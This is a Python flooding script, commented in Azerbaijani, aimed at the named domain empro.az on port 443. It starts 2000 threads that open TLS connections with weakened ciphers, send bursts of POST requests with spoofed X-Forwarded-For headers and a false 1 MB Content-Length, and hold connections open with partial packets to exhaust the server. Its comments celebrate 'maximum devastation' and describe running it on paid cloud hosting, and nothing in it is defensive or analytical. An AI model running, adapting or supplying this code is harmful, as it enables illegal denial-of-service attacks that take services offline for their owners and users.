import socket
import ssl
import threading
import random
import string
import time
import os

# --- MAXIMUM DEVASTATION CONFIG ---
TARGET_HOST = "empro.az"
TARGET_PORT = 443
THREADS = 2000 # Railway Paid üçün maksimal şəbəkə sıxlığı

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def final_strike():
    # SSL Handshake-i serveri deşifrə ilə yormaq üçün mürəkkəb ciphers ilə qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrləməni ən baha başa gələn üsulda (RSA-AES) saxlayırıq ki, server CPU-su kilitlənsin
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # HTTP/2 Rapid Reset & Header Frame Overload təqlidi
            # Sənaye səviyyəli "qadağan olunmuş" metod
            for _ in range(300):
                path = f"/?v={time.time()}&id={r_str(30)}&search={r_str(100)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                # Content-Length hiləsi ilə serverin prosessorunu dondururuq
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"X-Requested-With: XMLHttpRequest\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 1048576\r\n" # 1 Megabyte yalançı müraciət
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
                conn.send(os.urandom(1))
            
            # Bağlantını bağlamırıq, timeout olana qədər serverin portunu tuturuq
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"💀 SINGULARITY PROTOCOL INITIALIZED: {TARGET_HOST}")
    print("[!] Target Buffer is being saturated at the protocol level.")
    
    for i in range(THREADS):
        t = threading.Thread(target=final_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Protocol Warheads Active...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
